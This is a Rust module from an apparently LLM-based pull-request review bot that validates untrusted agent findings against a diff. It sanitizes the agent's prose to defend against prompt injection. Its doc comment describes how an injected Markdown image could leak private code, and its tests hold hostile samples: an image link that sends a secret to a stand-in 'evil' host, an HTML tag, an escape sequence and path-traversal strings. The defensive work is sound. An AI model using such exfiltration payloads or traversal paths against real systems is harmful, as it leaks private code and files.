//! Agent output parsing and validation.
//!
//! Agent output is untrusted: the agent reads attacker-controlled code and may
//! follow injected instructions. Everything here assumes hostile input. Only
//! well-formed findings that point into the diff become inline comments.

use std::collections::{BTreeMap, HashMap};

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::config::truncate_chars;
use crate::diff::FileDiff;

pub const MAX_TITLE_CHARS: usize = 200;
pub const MAX_BODY_CHARS: usize = 4_000;
pub const MAX_SUGGESTION_CHARS: usize = 4_000;
pub const MAX_SUMMARY_CHARS: usize = 4_000;
/// Findings beyond this count are dropped before validation.
pub const MAX_RAW_FINDINGS: usize = 200;

#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize, Default,
)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Info,
    #[default]
    Low,
    Medium,
    High,
    Critical,
}

impl Severity {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Info => "info",
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum Category {
    Security,
    Bug,
    Regression,
    Performance,
    #[default]
    #[serde(other)]
    Other,
}

impl Category {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Security => "security",
            Self::Bug => "bug",
            Self::Regression => "regression",
            Self::Performance => "performance",
            Self::Other => "other",
        }
    }
}

/// The JSON object that agents must return.
#[derive(Debug, Clone, Default, Deserialize)]
pub struct AgentReview {
    #[serde(default)]
    pub summary: String,
    #[serde(default)]
    pub findings: Vec<RawFinding>,
}

#[derive(Debug, Clone, Deserialize)]
pub struct RawFinding {
    pub path: String,
    #[serde(default)]
    pub start_line: Option<u32>,
    pub line: u32,
    pub severity: Severity,
    #[serde(default)]
    pub category: Category,
    pub title: String,
    #[serde(default)]
    pub body: String,
    #[serde(default)]
    pub suggestion: Option<String>,
}

/// A validated finding, safe to publish.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Finding {
    pub path: String,
    pub start_line: Option<u32>,
    pub line: u32,
    pub severity: Severity,
    pub category: Category,
    pub title: String,
    pub body: String,
    pub suggestion: Option<String>,
    /// Stable ID used to skip findings already posted on this pull request.
    pub fingerprint: String,
    /// True when the finding can be an inline comment on the diff.
    pub inline: bool,
}

pub struct ValidationOptions {
    pub min_severity: Severity,
    pub max_inline: usize,
}

#[derive(Debug, Default)]
pub struct Validated {
    pub summary: String,
    /// Sorted by severity, highest first.
    pub findings: Vec<Finding>,
    pub dropped: usize,
}

/// Validates agent findings against the pull request diff.
///
/// `files` holds the reviewed files. A finding on a path outside it is
/// dropped. A finding on a line outside the diff stays as a summary-only
/// finding. Duplicate fingerprints keep the most severe copy.
pub fn validate(
    review: AgentReview,
    files: &HashMap<String, FileDiff>,
    options: &ValidationOptions,
) -> Validated {
    let mut summary = sanitize_text(&review.summary);
    truncate_chars(&mut summary, MAX_SUMMARY_CHARS);
    let mut out = Validated {
        summary,
        ..Default::default()
    };
    let mut by_fingerprint: BTreeMap<String, Finding> = BTreeMap::new();

    let total = review.findings.len();
    for raw in review.findings.into_iter().take(MAX_RAW_FINDINGS) {
        match validate_one(raw, files, options) {
            Some(finding) => {
                let keep = by_fingerprint
                    .get(&finding.fingerprint)
                    .is_none_or(|old| finding.severity > old.severity);
                if keep {
                    by_fingerprint.insert(finding.fingerprint.clone(), finding);
                } else {
                    out.dropped += 1;
                }
            }
            None => out.dropped += 1,
        }
    }
    out.dropped += total.saturating_sub(MAX_RAW_FINDINGS);

    let mut findings: Vec<Finding> = by_fingerprint.into_values().collect();
    findings.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.path.cmp(&b.path))
            .then_with(|| a.line.cmp(&b.line))
    });
    let mut inline = 0;
    for finding in &mut findings {
        if finding.inline {
            if inline >= options.max_inline {
                finding.inline = false;
                finding.suggestion = None;
            } else {
                inline += 1;
            }
        }
    }
    out.findings = findings;
    out
}

fn validate_one(
    raw: RawFinding,
    files: &HashMap<String, FileDiff>,
    options: &ValidationOptions,
) -> Option<Finding> {
    if raw.severity < options.min_severity || raw.line == 0 {
        return None;
    }
    let path = normalize_path(&raw.path)?;
    let diff = files.get(&path)?;

    let mut title = sanitize_text(raw.title.lines().next().unwrap_or_default());
    truncate_chars(&mut title, MAX_TITLE_CHARS);
    if title.trim().is_empty() {
        return None;
    }
    let mut body = sanitize_text(&raw.body);
    truncate_chars(&mut body, MAX_BODY_CHARS);

    let start = raw.start_line.filter(|&s| s > 0 && s < raw.line);
    let inline = diff.is_range_commentable(start.unwrap_or(raw.line), raw.line);
    // Suggestions replace the commented lines, so they need a valid range.
    let suggestion = raw
        .suggestion
        .filter(|s| inline && !s.trim().is_empty() && s.chars().count() <= MAX_SUGGESTION_CHARS)
        .map(|s| strip_control(&s));

    let anchor = diff
        .line(raw.line)
        .map(|l| l.content.trim().to_owned())
        .unwrap_or_else(|| raw.line.to_string());
    let fingerprint = fingerprint(&path, raw.category, &title, &anchor);

    Some(Finding {
        path,
        start_line: if inline { start } else { None },
        line: raw.line,
        severity: raw.severity,
        category: raw.category,
        title,
        body,
        suggestion,
        fingerprint,
        inline,
    })
}

/// Rejects absolute paths, `..`, and empty segments. Strips a leading `./`.
pub fn normalize_path(path: &str) -> Option<String> {
    let path = path.trim().trim_start_matches("./");
    if path.is_empty() || path.starts_with('/') || path.contains('\\') {
        return None;
    }
    if path
        .split('/')
        .any(|part| part.is_empty() || part == "." || part == "..")
    {
        return None;
    }
    Some(path.to_owned())
}

/// Hash of the location and meaning of a finding. It uses the line content,
/// not the line number, so it stays stable when earlier lines move.
pub fn fingerprint(path: &str, category: Category, title: &str, anchor: &str) -> String {
    let normalized: String = title
        .to_lowercase()
        .split(|c: char| !c.is_alphanumeric())
        .filter(|w| !w.is_empty())
        .collect::<Vec<_>>()
        .join(" ");
    let mut hasher = Sha256::new();
    for part in [path, category.as_str(), &normalized, anchor] {
        hasher.update(part.as_bytes());
        hasher.update([0]);
    }
    hex::encode(&hasher.finalize()[..16])
}

fn strip_control(text: &str) -> String {
    text.chars()
        .filter(|&c| !c.is_control() || c == '\n' || c == '\t')
        .collect()
}

/// Makes agent prose safe to publish as GitHub Markdown.
///
/// - Escapes HTML, so no raw tags or comments reach the page.
/// - Disables Markdown images. GitHub fetches image URLs, so an injected
///   image could leak private code to an attacker server in the URL.
/// - Breaks `@mentions` so the bot cannot ping users or teams.
pub fn sanitize_text(text: &str) -> String {
    let text = strip_control(text);
    let mut out = String::with_capacity(text.len());
    let mut prev: Option<char> = None;
    for c in text.chars() {
        match c {
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '[' if prev == Some('!') => out.push_str("\\["),
            '@' if !prev.is_some_and(|p| p.is_alphanumeric()) => out.push_str("@\u{200B}"),
            _ => out.push(c),
        }
        prev = Some(c);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn files() -> HashMap<String, FileDiff> {
        let patch = "@@ -1,2 +1,4 @@\n a\n+b\n+c\n d\n@@ -20,1 +22,1 @@\n-x\n+y";
        HashMap::from([("src/a.rs".to_owned(), FileDiff::parse("src/a.rs", patch))])
    }

    fn raw(path: &str, line: u32, severity: Severity, title: &str) -> RawFinding {
        RawFinding {
            path: path.into(),
            start_line: None,
            line,
            severity,
            category: Category::Bug,
            title: title.into(),
            body: "why".into(),
            suggestion: Some("fixed".into()),
        }
    }

    fn opts() -> ValidationOptions {
        ValidationOptions {
            min_severity: Severity::Low,
            max_inline: 10,
        }
    }

    #[test]
    fn parses_agent_json_leniently() {
        let review: AgentReview = serde_json::from_str(
            r#"{"summary":"s","findings":[{"path":"a","line":3,"severity":"high","category":"style","title":"t"}]}"#,
        )
        .unwrap();
        assert_eq!(review.findings[0].category, Category::Other);
        assert!(
            serde_json::from_str::<AgentReview>(
                r#"{"findings":[{"path":"a","line":1,"severity":"urgent","title":"t"}]}"#
            )
            .is_err()
        );
    }

    #[test]
    fn keeps_inline_findings_and_moves_others_to_summary() {
        let review = AgentReview {
            summary: "ok".into(),
            findings: vec![
                raw("src/a.rs", 2, Severity::High, "inline"),
                raw("src/a.rs", 10, Severity::Medium, "outside diff"),
                raw("src/other.rs", 1, Severity::High, "unknown file"),
                raw("../etc/passwd", 1, Severity::High, "traversal"),
                raw("src/a.rs", 3, Severity::Info, "below threshold"),
            ],
        };
        let out = validate(review, &files(), &opts());
        assert_eq!(out.findings.len(), 2);
        assert_eq!(out.dropped, 3);
        assert!(out.findings[0].inline);
        assert_eq!(out.findings[0].suggestion.as_deref(), Some("fixed"));
        assert!(!out.findings[1].inline);
        assert_eq!(out.findings[1].suggestion, None);
    }

    #[test]
    fn multi_line_range_must_be_in_one_hunk() {
        let mut ok = raw("src/a.rs", 3, Severity::High, "range");
        ok.start_line = Some(1);
        let mut bad = raw("src/a.rs", 22, Severity::High, "split");
        bad.start_line = Some(4);
        let out = validate(
            AgentReview {
                summary: String::new(),
                findings: vec![ok, bad],
            },
            &files(),
            &opts(),
        );
        let ok = out.findings.iter().find(|f| f.title == "range").unwrap();
        assert_eq!((ok.start_line, ok.inline), (Some(1), true));
        let bad = out.findings.iter().find(|f| f.title == "split").unwrap();
        assert_eq!((bad.start_line, bad.inline), (None, false));
    }

    #[test]
    fn dedupes_and_caps_inline() {
        let review = AgentReview {
            summary: String::new(),
            findings: vec![
                raw("src/a.rs", 2, Severity::Low, "Same Bug!"),
                raw("src/a.rs", 2, Severity::High, "same bug"),
                raw("src/a.rs", 3, Severity::Medium, "other"),
            ],
        };
        let out = validate(
            review,
            &files(),
            &ValidationOptions {
                min_severity: Severity::Info,
                max_inline: 1,
            },
        );
        assert_eq!(out.findings.len(), 2);
        assert_eq!(out.findings[0].severity, Severity::High);
        assert!(out.findings[0].inline);
        assert!(!out.findings[1].inline);
    }

    #[test]
    fn fingerprint_ignores_line_moves_and_title_case() {
        let a = fingerprint("p", Category::Bug, "Null deref!", "x.unwrap()");
        let b = fingerprint("p", Category::Bug, "null  DEREF", "x.unwrap()");
        let c = fingerprint("p", Category::Bug, "null deref", "y.unwrap()");
        assert_eq!(a, b);
        assert_ne!(a, c);
    }

    #[test]
    fn sanitizes_markdown_attacks() {
        let out =
            sanitize_text("hi @team ![x](https://evil/?d=secret) <img src=x> a@b.c\u{1b}[31m");
        assert!(out.contains("@\u{200B}team"));
        assert!(out.contains("!\\[x]"));
        assert!(out.contains("&lt;img"));
        assert!(out.contains("a@b.c"));
        assert!(!out.contains('\u{1b}'));
    }

    #[test]
    fn normalizes_paths() {
        assert_eq!(normalize_path("./src/a.rs").as_deref(), Some("src/a.rs"));
        for bad in ["/etc/passwd", "a/../b", "a//b", "", "a\\b", "a/./b"] {
            assert_eq!(normalize_path(bad), None, "{bad}");
        }
    }
}
